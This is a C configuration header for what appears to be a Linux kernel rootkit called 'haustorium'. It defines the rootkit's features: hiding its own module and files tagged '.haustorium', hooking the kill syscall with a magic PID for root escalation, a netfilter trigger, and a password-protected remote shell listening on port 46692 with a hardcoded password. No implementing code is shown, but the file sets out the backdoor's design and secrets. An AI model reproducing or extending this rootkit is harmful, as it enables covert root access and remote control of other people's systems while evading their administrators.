#ifndef HTM_CONFIG_H
#define HTM_CONFIG_H

#define HTM_DEBUG

#define HTM_MAX_STRING 1024
#define HTM_MAX_WRITE_CDD 1024

#define HTM_CMD_EXEC            "exec"
#define HTM_CMD_DISABLE_CDD     "disable-cdd"
#define HTM_CMD_DISABLE_DEBUGFS "disable-debugfs"
#define HTM_CMD_DISABLE_FS      "disable-fs"
#define HTM_CMD_DISABLE_NF      "disable-nf"
#define HTM_CMD_ENABLE_CDD      "enable-cdd"
#define HTM_CMD_ENABLE_DEBUGFS  "enable-debugfs"
#define HTM_CMD_ENABLE_FS       "enable-fs"
#define HTM_CMD_ENABLE_NF       "enable-nf"
#define HTM_CMD_HIDE_MODULE     "hide-module"
#define HTM_CMD_RSH             "rsh"
#define HTM_CMD_SHOW_MODULE     "show-module"
#define HTM_CMD_SUDO            "sudo"

#define HTM_PID 46692 // Feigerbaum's constant

#define HTM_SIG_DISABLE_CDD     1
#define HTM_SIG_DISABLE_DEBUGFS 2
#define HTM_SIG_DISABLE_FS      3
#define HTM_SIG_DISABLE_NF      4
#define HTM_SIG_ENABLE_CDD      5
#define HTM_SIG_ENABLE_DEBUGFS  6
#define HTM_SIG_ENABLE_FS       7
#define HTM_SIG_ENABLE_NF       8
#define HTM_SIG_HIDE_MODULE     9
#define HTM_SIG_SHOW_MODULE     10
#define HTM_SIG_STATUS          11
#define HTM_SIG_SUDO            12

#define HTM_FS_STRING ".haustorium"

#define HTM_CDD_NAME "htm"

#define HTM_DEBUGFS_DIR "htm" HTM_FS_STRING
#define HTM_DEBUGFS_FILE "rsh" HTM_FS_STRING

#define HTM_RSH_PATH "/tmp/rsh" HTM_FS_STRING
#define HTM_RSH_PASSWORD "haustorium"
#define HTM_RSH_PORT 46692
#define HTM_RSH_PORT_STRING "46692"

#define HTM_EXEC_SHELL "/usr/bin/bash"
#define HTM_EXEC_ENVP { "HOME=/dev/shm", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", "TERM=xterm-256color", NULL }

#define HTM_INIT_HIDE_MODULE
#define HTM_INIT_HIDE_FS
#define HTM_INIT_INTERFACE_NETFILTER
#define HTM_INIT_INTERFACE_SYS_KILL
//#define HTM_INIT_INTERFACE_CDD
#endif
